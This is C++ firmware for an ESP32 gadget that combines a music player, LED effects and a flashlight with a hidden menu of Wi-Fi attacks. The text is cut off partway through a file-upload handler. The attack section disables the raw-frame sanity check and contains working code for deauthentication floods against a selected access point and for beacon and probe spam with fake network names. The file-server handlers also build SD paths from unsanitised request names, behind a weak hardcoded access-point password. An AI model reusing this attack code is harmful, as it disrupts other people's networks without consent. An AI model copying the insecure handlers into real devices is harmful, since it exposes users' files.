// ============================================================
//  SOUMYA Gadget v9.0 — Complete Fixed Firmware
//  ESP32-WROOM-32 | Core 2.0.17
// ============================================================

#include <Arduino.h>
#include <Wire.h>
#include <SPI.h>
#include <SD.h>
#include <FS.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <Adafruit_NeoPixel.h>
#include <WiFi.h>
#include <WebServer.h>
#include <Preferences.h>
#include "AudioFileSourceSD.h"
#include "AudioGeneratorMP3.h"
#include "AudioOutputI2SNoDAC.h"
#include "AudioOutput.h"
#include "BluetoothA2DPSource.h"
#include <esp_wifi.h>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t,int32_t,int32_t){ return 0; }

#include "led_music_ui.h"
#include "file_ui.h"
#include "attacks_ui.h"

// ═══════════════════════════════════════════════════════════
//  PINS & CONSTANTS
// ═══════════════════════════════════════════════════════════
#define OLED_SDA 21
#define OLED_SCL 22
#define OLED_ADDR 0x3C
#define SCR_W 128
#define SCR_H 64

#define PIN_SD_CS 5
#define PIN_SD_CLK 18
#define PIN_SD_MISO 19
#define PIN_SD_MOSI 23

#define PIN_LED_DATA 13
#define LED_MAX 144
#define PIN_STATUS_LED 12
#define STATUS_LED_COUNT 2

#define BTN_UP 14
#define BTN_DOWN 27
#define BTN_SEL 32
#define BTN_BACK 33

#define DEBOUNCE_MS 80
#define LONGPRESS_MS 1500
#define COMBO_TIMEOUT_MS 2500UL

#define AP_SSID "ESP32-Gadget"
#define AP_PASS "88888888"
#define AP_CHANNEL 6
#define BT_NAME "ESP32-MultiTool"
#define MUSIC_FOLDER "/music"
#define RING_BUF_SIZE 16384

// ═══════════════════════════════════════════════════════════
//  ENUMS
// ═══════════════════════════════════════════════════════════
enum DeviceMode : uint8_t {
    MODE_BOOT, MODE_MAIN_MENU, MODE_PLAYER, MODE_PLAYER_SYNC,
    MODE_SONGS, MODE_BLUETOOTH,
    MODE_GAMES, MODE_FLAPPY, MODE_SNAKE,
    MODE_LED_MENU, MODE_LED_EFFECTS, MODE_LED_MUSIC, MODE_LED_BRIGHT, MODE_LED_WIFI,
    MODE_FLASHLIGHT_MENU,
    MODE_SETTINGS, MODE_SETTINGS_INFO,
    MODE_WIFI_FILES,
    MODE_HIDDEN_MENU, MODE_WIFI_TOOLS, MODE_BT_TOOLS, MODE_IR_REMOTE,
    MODE_WIFI_CONTROL, MODE_ATTACK_RUN
};

enum AttackMode : uint8_t {
    ATK_NONE, ATK_BEACON, ATK_DEAUTH, ATK_PROBE
};

// ═══════════════════════════════════════════════════════════
//  STATE
// ═══════════════════════════════════════════════════════════
struct DeviceState {
    DeviceMode mode = MODE_BOOT;
    int menuSel = 0;
    int volume = 75;
    int ledBright = 150;
    int ledCount = 60;
    int curEffect = 1;
    bool btConnected = false;
    bool displaySleepEnabled = true;
    int currentSong = 0;
    int songCount = 0;
    bool isPlaying = false;
    bool isPaused = false;
    int flashBright = 75;
    int flashColor = 0;
    int flashEffect = 0;
    bool flashOn = false;
    int syncEffect = 4;
    bool wifiFilesAP = false;
};
DeviceState g;

struct APRecord { char ssid[33]; char bssid[18]; int rssi; int channel; };

// Forward declarations
static void drawMessage(const char* l1, const char* l2);
static void drawCentered(const char* text, int y, int size);

// ═══════════════════════════════════════════════════════════
//  GLOBALS
// ═══════════════════════════════════════════════════════════
Adafruit_SSD1306 display(SCR_W, SCR_H, &Wire, -1);
Adafruit_NeoPixel strip(LED_MAX, PIN_LED_DATA, NEO_GRB + NEO_KHZ800);
Adafruit_NeoPixel statusStrip(STATUS_LED_COUNT, PIN_STATUS_LED, NEO_GRB + NEO_KHZ800);
Preferences prefs;

BluetoothA2DPSource a2dp_source;
static bool a2dpStarted = false;

WebServer ledServer(80);
WebServer fileServer(81);
WebServer attackServer(8080);
static bool webServersRunning = false;

String songFiles[200];
int songIndices[200];
int songCount = 0;

static APRecord scannedAPs[30];
static int scannedCount = 0;

static volatile bool atkRunning = false;
static AttackMode atkMode = ATK_NONE;
static TaskHandle_t atkTask = nullptr;
static char atkSSID[33];
static char atkBSSID[18];
static int atkChannel = 1;
static volatile int atkPacketCount = 0;

static bool flashOn = false;

static unsigned long lastActivityMs = 0;
static bool displaySleep = false;

static bool volPopupVisible = false;
static unsigned long volPopupShownMs = 0;
static const unsigned long VOL_POPUP_MS = 2500;

static int comboSeq = 0;
static unsigned long comboLastMs = 0;

// ═══════════════════════════════════════════════════════════
//  BATTERY
// ═══════════════════════════════════════════════════════════
static int readBatteryPct() {
    long sum = 0;
    for (int i = 0; i < 10; i++) sum += analogRead(34);
    float v = (sum / 10.0f / 4095.0f) * 3.3f * 2.0f;
    if (v >= 4.15f) return 100;
    if (v <= 3.30f) return 0;
    return (int)((v - 3.30f) / (4.15f - 3.30f) * 100);
}

// ═══════════════════════════════════════════════════════════
//  DISPLAY HELPERS
// ═══════════════════════════════════════════════════════════
static void wakeDisplay() {
    lastActivityMs = millis();
    if (displaySleep) {
        displaySleep = false;
        display.ssd1306_command(SSD1306_DISPLAYON);
    }
}

static void checkDisplaySleep() {
    if (!g.displaySleepEnabled) return;
    if (!displaySleep && (millis() - lastActivityMs > 30000UL)) {
        displaySleep = true;
        display.clearDisplay();
        display.display();
        display.ssd1306_command(SSD1306_DISPLAYOFF);
    }
}

static void drawBatteryIcon(int x, int y) {
    int pct = readBatteryPct();
    display.drawRect(x, y, 16, 9, BLACK);
    display.drawRect(x + 16, y + 3, 2, 3, BLACK);
    int fill = (pct * 12) / 100;
    if (fill > 0) display.fillRect(x + 2, y + 2, fill, 5, BLACK);
}

static void drawHeader(const char* title) {
    display.fillRect(0, 0, SCR_W, 13, WHITE);
    display.setTextColor(BLACK);
    display.setTextSize(1);
    display.setCursor(4, 3);
    display.print(title);
    drawBatteryIcon(SCR_W - 22, 2);
    display.setTextColor(WHITE);
}

static void drawHintlessHeader(const char* title) {
    display.drawFastHLine(0, 0, SCR_W, WHITE);
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(4, 5);
    display.print(title);
    drawBatteryIcon(SCR_W - 22, 4);
}

static void drawCentered(const char* text, int y, int size) {
    display.setTextSize(size);
    int tw = strlen(text) * (size == 2 ? 12 : 6);
    int x = (SCR_W - tw) / 2;
    if (x < 0) x = 0;
    display.setCursor(x, y);
    display.print(text);
}

static void drawMessage(const char* l1, const char* l2) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(WHITE);
    int x1 = (SCR_W - (int)strlen(l1) * 6) / 2;
    if (x1 < 0) x1 = 0;
    display.setCursor(x1, l2 ? 22 : 28);
    display.print(l1);
    if (l2) {
        int x2 = (SCR_W - (int)strlen(l2) * 6) / 2;
        if (x2 < 0) x2 = 0;
        display.setCursor(x2, 36);
        display.print(l2);
    }
    display.display();
}

static void drawMenuList(const char* items[], int count, int sel, int iconOffset) {
    int visRows = 4;
    int offset = max(0, min(sel - 1, count - visRows));
    for (int i = 0; i < visRows && (i + offset) < count; i++) {
        int idx = i + offset;
        int y = 16 + i * 11;
        bool s = (idx == sel);
        if (s) {
            display.fillRoundRect(0, y, SCR_W, 10, 3, WHITE);
            display.setTextColor(BLACK);
            display.fillTriangle(2, y + 5, 5, y + 2, 5, y + 8, BLACK);
        } else {
            display.setTextColor(WHITE);
            display.fillTriangle(2, y + 5, 5, y + 2, 5, y + 8, WHITE);
        }
        display.setCursor(iconOffset, y + 2);
        display.print(items[idx]);
        display.setTextColor(WHITE);
    }
    if (count > visRows) {
        int barH = 44;
        int posY = 16 + (sel * (barH - 8)) / (count - 1);
        display.drawRect(SCR_W - 2, 16, 2, barH, WHITE);
        display.fillRect(SCR_W - 2, posY, 2, 8, WHITE);
    }
}

// ═══════════════════════════════════════════════════════════
//  AUDIO
// ═══════════════════════════════════════════════════════════
static int16_t rb[RING_BUF_SIZE];
static volatile int rb_head = 0, rb_tail = 0;
static portMUX_TYPE rb_mux = portMUX_INITIALIZER_UNLOCKED;

static int rb_available() { return (rb_head - rb_tail + RING_BUF_SIZE) % RING_BUF_SIZE; }

static void rb_push(int16_t L, int16_t R) {
    portENTER_CRITICAL(&rb_mux);
    int next = (rb_head + 2) % RING_BUF_SIZE;
    if (next != rb_tail) {
        rb[rb_head] = L;
        rb[(rb_head + 1) % RING_BUF_SIZE] = R;
        rb_head = next;
    }
    portEXIT_CRITICAL(&rb_mux);
}

static bool rb_pop(int16_t &L, int16_t &R) {
    portENTER_CRITICAL(&rb_mux);
    bool ok = (rb_tail != rb_head);
    if (ok) {
        L = rb[rb_tail]; rb_tail = (rb_tail + 1) % RING_BUF_SIZE;
        R = rb[rb_tail]; rb_tail = (rb_tail + 1) % RING_BUF_SIZE;
    }
    portEXIT_CRITICAL(&rb_mux);
    return ok;
}

class AudioOutputRingBuffer : public AudioOutput {
public:
    bool ConsumeSample(int16_t sample[2]) override { rb_push(sample[0], sample[1]); return true; }
    bool begin() override { return true; }
    bool stop()  override { return true; }
};

static int32_t a2dp_data_cb(Frame* frames, int32_t n) {
    for (int i = 0; i < n; i++) {
        int16_t L = 0, R = 0;
        rb_pop(L, R);
        frames[i].channel1 = L;
        frames[i].channel2 = R;
    }
    return n;
}

static AudioFileSource* audioSrc = nullptr;
static AudioGeneratorMP3* audioMP3 = nullptr;
static AudioOutputI2SNoDAC* audioDac = nullptr;
static AudioOutputRingBuffer* audioRB = nullptr;
static bool audioRunning = false;
static unsigned long songStartMs = 0;
static unsigned long songPausedMs = 0;

static void shuffleIdx(int* a, int n) {
    for (int i = n - 1; i > 0; i--) {
        int j = random(0, i + 1);
        int t = a[i]; a[i] = a[j]; a[j] = t;
    }
}

static void loadSongList() {
    songCount = 0;
    File dir = SD.open(MUSIC_FOLDER);
    if (!dir || !dir.isDirectory()) return;
    File f = dir.openNextFile();
    while (f && songCount < 200) {
        String n = String(f.name());
        if (!f.isDirectory() && (n.endsWith(".mp3") || n.endsWith(".MP3"))) {
            songFiles[songCount] = String(MUSIC_FOLDER) + "/" + n;
            songIndices[songCount] = songCount;
            songCount++;
        }
        f = dir.openNextFile();
    }
    dir.close();
    shuffleIdx(songIndices, songCount);
    g.songCount = songCount;
}

static String getSongName(int idx) {
    if (idx < 0 || idx >= songCount) return "No songs";
    String p = songFiles[songIndices[idx]];
    String n = p.substring(p.lastIndexOf('/') + 1);
    n.replace(".mp3", ""); n.replace(".MP3", "");
    return n;
}

static void initAudio() {
    if (g.btConnected) {
        if (a2dpStarted) { a2dp_source.end(); delay(300); a2dpStarted = false; }
        a2dp_source.set_auto_reconnect(true);
        a2dp_source.start(BT_NAME, a2dp_data_cb);
        a2dpStarted = true;
    } else if (!audioDac) {
        audioDac = new AudioOutputI2SNoDAC();
        audioDac->SetGain(g.volume / 100.0f);
    }
}

static void playSong(int idx) {
    if (songCount == 0) return;
    if (audioMP3 && audioMP3->isRunning()) {
        audioMP3->stop();
        if (audioSrc) audioSrc->close();
    }
    delete audioMP3; audioMP3 = nullptr;
    delete audioSrc; audioSrc = nullptr;

    g.currentSong = idx;
    String path = songFiles[songIndices[idx]];
    audioSrc = new AudioFileSourceSD(path.c_str());
    audioMP3 = new AudioGeneratorMP3();
    AudioOutput* out = g.btConnected ? (AudioOutput*)audioRB : (AudioOutput*)audioDac;
    if (!out) return;
    if (audioMP3->begin(audioSrc, out)) {
        audioRunning = true;
        g.isPlaying = true;
        g.isPaused = false;
        songStartMs = millis();
    }
}

static void nextSong() {
    if (songCount == 0) return;
    playSong((g.currentSong + 1) % songCount);
}

static void prevSong() {
    if (songCount == 0) return;
    playSong((g.currentSong - 1 + songCount) % songCount);
}

static void stopAudio() {
    if (audioMP3 && audioMP3->isRunning()) audioMP3->stop();
    audioRunning = false;
    g.isPlaying = false;
    g.isPaused = false;
}

static void togglePause() {
    if (!audioMP3) return;
    if (g.isPaused) {
        g.isPaused = false;
        g.isPlaying = true;
        songStartMs += millis() - songPausedMs;
    } else {
        g.isPaused = true;
        g.isPlaying = false;
        songPausedMs = millis();
    }
}

static void setVolume(int v) {
    g.volume = constrain(v, 0, 100);
    if (audioDac) audioDac->SetGain(g.volume / 100.0f);
}

static void updateAudio() {
    if (!audioMP3 || !audioRunning || g.isPaused) return;
    if (audioMP3->isRunning()) {
        if (!audioMP3->loop()) {
            audioMP3->stop();
            audioRunning = false;
            g.isPlaying = false;
            nextSong();
        }
    }
}

static float getAudioAmplitude() {
    int n = rb_available();
    if (n < 64) return 0.0f;
    long sum = 0;
    int tmp = rb_tail;
    int samples = min(n, 256);
    for (int i = 0; i < samples; i++) {
        sum += abs((int)rb[tmp]);
        tmp = (tmp + 1) % RING_BUF_SIZE;
    }
    return constrain((float)sum / samples / 32768.0f * 4.0f, 0.0f, 1.0f);
}

// ═══════════════════════════════════════════════════════════
//  LED EFFECTS
// ═══════════════════════════════════════════════════════════
static inline uint32_t hsv2px(uint8_t h, uint8_t s, uint8_t v) {
    return strip.ColorHSV((uint16_t)h * 257, s, v);
}
static int ledHue = 0;
static int staticHue = 0;

static void fxSolid() {
    for (int i = 0; i < g.ledCount; i++) strip.setPixelColor(i, hsv2px(staticHue, 255, g.ledBright));
}
static void fxRainbow() {
    for (int i = 0; i < g.ledCount; i++)
        strip.setPixelColor(i, hsv2px((ledHue + i * 256 / max(g.ledCount, 1)) & 0xFF, 255, g.ledBright));
    ledHue = (ledHue + 2) & 0xFF;
}
static void fxBreathe() {
    float b = (sin(millis() / 1000.0f) + 1.0f) / 2.0f;
    uint8_t v = (uint8_t)(b * g.ledBright);
    for (int i = 0; i < g.ledCount; i++) strip.setPixelColor(i, hsv2px(staticHue, 255, v));
}
static void fxChase() {
    strip.clear();
    int pos = (millis() / 40) % g.ledCount;
    for (int i = 0; i < 5; i++)
        strip.setPixelColor((pos + i) % g.ledCount, hsv2px(staticHue, 255, g.ledBright >> i));
}
static void fxMusicBar() {
    strip.clear();
    int bars = 16;
    float amp = getAudioAmplitude();
    int lpb = max(1, g.ledCount / bars);
    for (int b = 0; b < bars; b++) {
        int h = (int)(amp * lpb * (0.5f + 0.5f * sin(b * 0.5f + millis() * 0.003f)));
        for (int k = 0; k < h && k < lpb; k++)
            strip.setPixelColor(b * lpb + k, hsv2px(map(b, 0, bars-1, 96, 0), 255, g.ledBright));
    }
}
static void fxMusicVU() {
    strip.clear();
    float amp = getAudioAmplitude();
    int fill = (int)(amp * (g.ledCount / 2));
    int mid = g.ledCount / 2;
    for (int i = 0; i < fill; i++) {
        uint32_t c = hsv2px(map(i, 0, mid, 96, 0), 255, g.ledBright);
        strip.setPixelColor(mid - i - 1, c);
        if (mid + i < g.ledCount) strip.setPixelColor(mid + i, c);
    }
}
static uint8_t beatPulse = 0;
static void fxBeatPulse() {
    uint8_t amp = (uint8_t)(getAudioAmplitude() * 255);
    if (amp > 120 && beatPulse == 0) beatPulse = 10;
    else if (beatPulse > 0) beatPulse--;
    if (beatPulse > 0) {
        for (int i = 0; i < g.ledCount; i++) strip.setPixelColor(i, hsv2px(staticHue, 255, g.ledBright));
    } else strip.clear();
}
static void fxSpectrum() {
    strip.clear();
    float amp = getAudioAmplitude();
    int bands = 16;
    int lpb = max(1, g.ledCount / bands);
    for (int b = 0; b < bands; b++) {
        float local = amp * (0.4f + 0.6f * sin(b * 0.7f + millis() * 0.005f));
        int h = (int)(local * lpb);
        for (int k = 0; k < h && k < lpb; k++)
            strip.setPixelColor(b * lpb + k, hsv2px(map(b, 0, bands-1, 96, 0), 255, g.ledBright));
    }
}
static uint8_t bassLvl = 0;
static void fxBassPulse() {
    uint8_t amp = (uint8_t)(getAudioAmplitude() * 255);
    if (amp > bassLvl) bassLvl = amp;
    else if (bassLvl > 5) bassLvl -= 5;
    else bassLvl = 0;
    uint8_t br = (uint8_t)((uint16_t)g.ledBright * bassLvl / 255);
    for (int i = 0; i < g.ledCount; i++) strip.setPixelColor(i, hsv2px(0, 255, br));
}
static void fxTrebleSparkle() {
    for (int i = 0; i < g.ledCount; i++) {
        uint32_t c = strip.getPixelColor(i);
        uint8_t r = (c >> 16) & 0xFF, gr = (c >> 8) & 0xFF, b = c & 0xFF;
        r = r > 20 ? r - 20 : 0; gr = gr > 20 ? gr - 20 : 0; b = b > 20 ? b - 20 : 0;
        strip.setPixelColor(i, r, gr, b);
    }
    uint8_t amp = (uint8_t)(getAudioAmplitude() * 255);
    if (amp > 40) {
        int count = 1 + amp / 40;
        for (int k = 0; k < count; k++) strip.setPixelColor(random(0, g.ledCount), 255, 255, 255);
    }
}
static void fxVUMirror() {
    strip.clear();
    float amp = getAudioAmplitude();
    int fill = (int)(amp * (g.ledCount / 2));
    int mid = g.ledCount / 2;
    for (int i = 0; i < fill; i++) {
        strip.setPixelColor(mid - i - 1, hsv2px(map(i, 0, mid, 85, 42), 255, g.ledBright));
        if (mid + i < g.ledCount) strip.setPixelColor(mid + i, hsv2px(map(i, 0, mid, 42, 0), 255, g.ledBright));
    }
}
static void fxWaveForm() {
    static uint8_t wavePhase = 0;
    wavePhase += 3;
    float amp = getAudioAmplitude();
    for (int i = 0; i < g.ledCount; i++) {
        float t = (i * 0.3f) + (wavePhase * 0.05f);
        float wave = (sin(t) + 1.0f) / 2.0f;
        uint8_t br = (uint8_t)(wave * amp * g.ledBright);
        strip.setPixelColor(i, hsv2px(160, 255, br));
    }
}

static void updateLEDEffect() {
    static unsigned long lastMs = 0;
    unsigned long now = millis();
    if (now - lastMs < 20) return;
    lastMs = now;
    switch (g.curEffect) {
        case 0: fxSolid(); break;
        case 1: fxRainbow(); break;
        case 2: fxBreathe(); break;
        case 3: fxChase(); break;
        case 4: fxMusicBar(); break;
        case 5: fxMusicVU(); break;
        case 6: fxBeatPulse(); break;
        case 7: fxSpectrum(); break;
        case 8: fxBassPulse(); break;
        case 9: fxTrebleSparkle(); break;
        case 10: fxVUMirror(); break;
        case 11: fxWaveForm(); break;
    }
    strip.show();
}

// ═══════════════════════════════════════════════════════════
//  FLASHLIGHT
// ═══════════════════════════════════════════════════════════
static const uint8_t FLASH_COLORS[7][3] = {
    {255,255,255}, {255,0,0}, {0,255,0}, {0,0,255}, {255,255,0}, {0,255,255}, {255,0,255}
};
static const char* FLASH_COLOR_NAMES[] = {"White","Red","Green","Blue","Yellow","Cyan","Magenta"};
static const char* FLASH_EFFECT_NAMES[] = {"Solid","Blink","Breathe","Strobe","SOS"};

static void flashApply(uint8_t r, uint8_t gv, uint8_t b) {
    uint8_t br = (uint8_t)((uint32_t)g.flashBright * 255 / 100);
    uint8_t rr = (uint8_t)((uint32_t)r * br / 255);
    uint8_t gg = (uint8_t)((uint32_t)gv * br / 255);
    uint8_t bb = (uint8_t)((uint32_t)b * br / 255);
    for (int i = 0; i < STATUS_LED_COUNT; i++) statusStrip.setPixelColor(i, rr, gg, bb);
    statusStrip.show();
}

static unsigned long flashLastMs = 0;
static int flashEffectStep = 0;

static void flashUpdate() {
    if (!flashOn) return;
    unsigned long now = millis();
    const uint8_t* c = FLASH_COLORS[g.flashColor];
    switch (g.flashEffect) {
        case 0: flashApply(c[0], c[1], c[2]); break;
        case 1:
            if (now - flashLastMs > 500) { flashLastMs = now; flashEffectStep ^= 1; }
            if (flashEffectStep) flashApply(c[0], c[1], c[2]); else flashApply(0, 0, 0);
            break;
        case 2: {
            float b = (sin(now / 500.0f) + 1.0f) / 2.0f;
            flashApply((uint8_t)(c[0]*b), (uint8_t)(c[1]*b), (uint8_t)(c[2]*b));
            break;
        }
        case 3:
            if (now - flashLastMs > 50) { flashLastMs = now; flashEffectStep ^= 1; }
            if (flashEffectStep) flashApply(c[0], c[1], c[2]); else flashApply(0, 0, 0);
            break;
        case 4: {
            static const uint16_t sos[] = {200,200,200,200,600,200,200,200,200,200,600,200,600,200,600,200,200,200,200,200,600,200,200,200,200,200,200};
            static int idx = 0;
            static unsigned long lastChange = 0;
            if (now - lastChange > sos[idx]) {
                lastChange = now;
                idx = (idx + 1) % (sizeof(sos)/sizeof(sos[0]));
                flashEffectStep = !flashEffectStep;
            }
            if (flashEffectStep) flashApply(c[0], c[1], c[2]); else flashApply(0, 0, 0);
            break;
        }
    }
}

static void flashSetPower(bool on) {
    flashOn = on;
    g.flashOn = on;
    if (!on) {
        for (int i = 0; i < STATUS_LED_COUNT; i++) statusStrip.setPixelColor(i, 0);
        statusStrip.show();
    }
}

// ═══════════════════════════════════════════════════════════
//  WIFI ATTACKS
// ═══════════════════════════════════════════════════════════
static uint8_t deauthFrame[26] = {
    0xC0,0x00, 0x00,0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0,0,0,0,0,0, 0,0,0,0,0,0, 0,0, 0x07,0x00
};

static bool parseMac(const char* s, uint8_t* out) {
    if (strlen(s) < 17) return false;
    unsigned int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]) != 6) return false;
    for (int i = 0; i < 6; i++) out[i] = (uint8_t)v[i];
    return true;
}

static int sendDeauthBurst(const uint8_t* bssid, int count) {
    int ok = 0;
    uint8_t f[26]; memcpy(f, deauthFrame, 26);
    memcpy(f + 10, bssid, 6); memcpy(f + 16, bssid, 6);
    for (int i = 0; i < count; i++) {
        f[22] = i & 0xFF; f[23] = (i >> 8) & 0xFF;
        if (esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false) == ESP_OK) ok++;
    }
    return ok;
}

static int buildBeacon(uint8_t* b, int bLen, const char* ssid, int ch) {
    int sl = strlen(ssid);
    if (sl > 32 || bLen < (38 + sl)) return 0;
    memset(b, 0, bLen);
    int i = 0;
    b[i++]=0x80; b[i++]=0x00; b[i++]=0x00; b[i++]=0x00;
    memset(b+i, 0xFF, 6); i += 6;
    uint8_t mac[6];
    for (int k = 0; k < 6; k++) mac[k] = random(0, 256);
    mac[0] = (mac[0] | 0x02) & 0xFE;
    memcpy(b+i, mac, 6); i += 6;
    memcpy(b+i, mac, 6); i += 6;
    i += 2; memset(b+i, 0, 8); i += 8;
    b[i++]=0x64; b[i++]=0x00; b[i++]=0x31; b[i++]=0x04;
    b[i++]=0x00; b[i++]=(uint8_t)sl;
    memcpy(b+i, ssid, sl); i += sl;
    b[i++]=0x01; b[i++]=0x08;
    const uint8_t r[] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
    memcpy(b+i, r, 8); i += 8;
    b[i++]=0x03; b[i++]=0x01; b[i++]=(uint8_t)ch;
    return i;
}

static const char* FAKE_SSIDS[] = {
    "JioFiber_5G","Airtel_Xstream","TP-Link_2.4G","Netgear_Home",
    "Sharma_Home","Rahul_iPhone","Home_Sweet_Home","AndroidAP_1234",
    "iPhone_Hotspot","Redmi_Note12","Samsung_A54","Cafe_Coffee_Day",
    "Free_Public_WiFi","Guest_Network","Setup_Required"
};
#define FAKE_COUNT (sizeof(FAKE_SSIDS)/sizeof(FAKE_SSIDS[0]))

static void attackWorker(void*) {
    uint8_t bssid[6];
    parseMac(atkBSSID, bssid);
    atkPacketCount = 0;

    if (atkMode == ATK_BEACON) {
        WiFi.mode(WIFI_STA); delay(100);
        uint8_t frame[256];
        while (atkRunning) {
            for (int ch = 1; ch <= 13 && atkRunning; ch++) {
                if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) continue;
                const char* ssid = FAKE_SSIDS[random(0, FAKE_COUNT)];
                int len = buildBeacon(frame, sizeof(frame), ssid, ch);
                if (len > 0) { esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false); atkPacketCount++; }
                delay(3);
            }
        }
    } else if (atkMode == ATK_DEAUTH) {
        WiFi.mode(WIFI_STA); delay(100);
        esp_wifi_set_channel(atkChannel, WIFI_SECOND_CHAN_NONE);
        while (atkRunning) {
            atkPacketCount += sendDeauthBurst(bssid, 50);
            delay(60);
        }
    } else if (atkMode == ATK_PROBE) {
        WiFi.mode(WIFI_STA); delay(100);
        uint8_t frame[128];
        while (atkRunning) {
            for (int ch = 1; ch <= 13 && atkRunning; ch++) {
                if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) continue;
                memset(frame, 0, sizeof(frame));
                int i = 0;
                frame[i++]=0x40; frame[i++]=0x00; frame[i++]=0x00; frame[i++]=0x00;
                memset(frame+i, 0xFF, 6); i += 6;
                uint8_t mac[6];
                for (int k = 0; k < 6; k++) mac[k] = random(0, 256);
                mac[0] = (mac[0] | 0x02) & 0xFE;
                memcpy(frame+i, mac, 6); i += 6;
                memcpy(frame+i, mac, 6); i += 6;
                i += 2;
                const char* ssid = FAKE_SSIDS[random(0, FAKE_COUNT)];
                int sl = strlen(ssid);
                frame[i++]=0x00; frame[i++]=(uint8_t)sl;
                memcpy(frame+i, ssid, sl); i += sl;
                frame[i++]=0x01; frame[i++]=0x08;
                const uint8_t r[] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
                memcpy(frame+i, r, 8); i += 8;
                esp_wifi_80211_tx(WIFI_IF_STA, frame, i, false);
                atkPacketCount++;
                delay(2);
            }
        }
    }
    WiFi.mode(WIFI_OFF);
    atkRunning = false;
    atkMode = ATK_NONE;
    vTaskDelete(nullptr);
}

static void startBeaconSpam() {
    if (atkRunning) return;
    atkMode = ATK_BEACON; atkRunning = true;
    xTaskCreatePinnedToCore(attackWorker, "atk", 4096, nullptr, 1, &atkTask, 0);
}
static void startProbe() {
    if (atkRunning) return;
    atkMode = ATK_PROBE; atkRunning = true;
    xTaskCreatePinnedToCore(attackWorker, "atk", 4096, nullptr, 1, &atkTask, 0);
}
static void startDeauth(int apIdx) {
    if (atkRunning) return;
    if (apIdx < 0 || apIdx >= scannedCount) return;
    strncpy(atkSSID, scannedAPs[apIdx].ssid, 32); atkSSID[32] = 0;
    strncpy(atkBSSID, scannedAPs[apIdx].bssid, 17); atkBSSID[17] = 0;
    atkChannel = scannedAPs[apIdx].channel;
    atkMode = ATK_DEAUTH; atkRunning = true;
    xTaskCreatePinnedToCore(attackWorker, "atk", 8192, nullptr, 1, &atkTask, 0);
}
static void stopAttack() {
    if (!atkRunning) return;
    atkRunning = false;
    delay(400);
}
static void wifiScan() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    int n = WiFi.scanNetworks(false, true);
    scannedCount = min(n, 30);
    for (int i = 0; i < scannedCount; i++) {
        strncpy(scannedAPs[i].ssid, WiFi.SSID(i).c_str(), 32); scannedAPs[i].ssid[32] = 0;
        strncpy(scannedAPs[i].bssid, WiFi.BSSIDstr(i).c_str(), 17); scannedAPs[i].bssid[17] = 0;
        scannedAPs[i].rssi = WiFi.RSSI(i);
        scannedAPs[i].channel = WiFi.channel(i);
    }
    WiFi.scanDelete();
}

// ═══════════════════════════════════════════════════════════
//  WEB HANDLERS
// ═══════════════════════════════════════════════════════════
static void handleLedRoot() { ledServer.send_P(200, "text/html", LED_MUSIC_HTML); }
static void handleLedCmd() {
    if (ledServer.hasArg("effect")) g.curEffect = ledServer.arg("effect").toInt();
    if (ledServer.hasArg("brightness")) {
        g.ledBright = constrain(ledServer.arg("brightness").toInt(), 0, 255);
        strip.setBrightness(g.ledBright);
    }
    if (ledServer.hasArg("count")) g.ledCount = constrain(ledServer.arg("count").toInt(), 1, LED_MAX);
    if (ledServer.hasArg("hue")) staticHue = ledServer.arg("hue").toInt() & 0xFF;
    ledServer.send(200, "text/plain", "OK");
}
static void handleMusicCmd() {
    String action = ledServer.arg("action");
    if (action == "play") {
        int idx = ledServer.arg("idx").toInt();
        if (idx >= 0 && idx < songCount) playSong(idx);
    } else if (action == "next") nextSong();
    else if (action == "prev") prevSong();
    else if (action == "stop") stopAudio();
    else if (action == "toggle") togglePause();
    else if (action == "bt") {
        g.btConnected = ledServer.arg("on").toInt() == 1;
        stopAudio();
        initAudio();
        if (g.btConnected && songCount > 0) playSong(g.currentSong);
    }
    ledServer.send(200, "text/plain", "OK");
}
static void handleMusicList() {
    String json = F("{\"songs\":[");
    for (int i = 0; i < songCount; i++) {
        if (i > 0) json += ',';
        json += F("{\"idx\":"); json += i;
        json += F(",\"name\":\""); json += getSongName(i); json += '"';
        json += '}';
    }
    json += F("],\"current\":"); json += g.currentSong;
    json += F(",\"playing\":"); json += (g.isPlaying ? "true" : "false");
    json += F(",\"bt\":"); json += (g.btConnected ? "true" : "false");
    json += '}';
    ledServer.send(200, "application/json", json);
}
static void handleFileRoot() { fileServer.send_P(200, "text/html", FILE_MANAGER_HTML); }
static void handleFileList() {
    uint32_t total = SD.totalBytes() >> 20;
    uint32_t free_ = (SD.totalBytes() - SD.usedBytes()) >> 20;
    String json = F("{\"files\":[");
    File dir = SD.open(MUSIC_FOLDER);
    bool first = true;
    if (dir) {
        File f = dir.openNextFile();
        while (f) {
            if (!f.isDirectory()) {
                if (!first) json += ',';
                json += F("{\"name\":\""); json += String(f.name());
                json += F("\",\"size\":"); json += (uint32_t)f.size(); json += '}';
                first = false;
            }
            f = dir.openNextFile();
        }
        dir.close();
    }
    json += F("],\"totalMB\":"); json += total;
    json += F(",\"freeMB\":"); json += free_;
    json += '}';
    fileServer.send(200, "application/json", json);
}
static void handleFileDelete() {
    String name = fileServer.arg("name");
    String path = String(MUSIC_FOLDER) + "/" + name;
    SD.remove(path.c_str());
    loadSongList();
    fileServer.send(200, "text/plain", "OK");
}
static void handleFileDownload() {
    String name = fileServer.arg("name");
    String path = String(MUSIC_FOLDER) + "/" + name;
    File f = SD.open(path.c_str(), FILE_READ);
    if (!f) { fileServer.send(404, "text/plain", "Not found"); return; }
    fileServer.sendHeader("Content-Disposition", "attachment; filename=" + name);
    fileServer.streamFile(f, "audio/mpeg");
    f.close();
}
static File _uploadFile;
static void handleFileUpload() {
    HTTPUpload& u = fileServer.upload();
    if (u.status == UPLOAD_FILE_START) {
        String path = String(MUSIC_FOLDER) + "/" + u.filename;
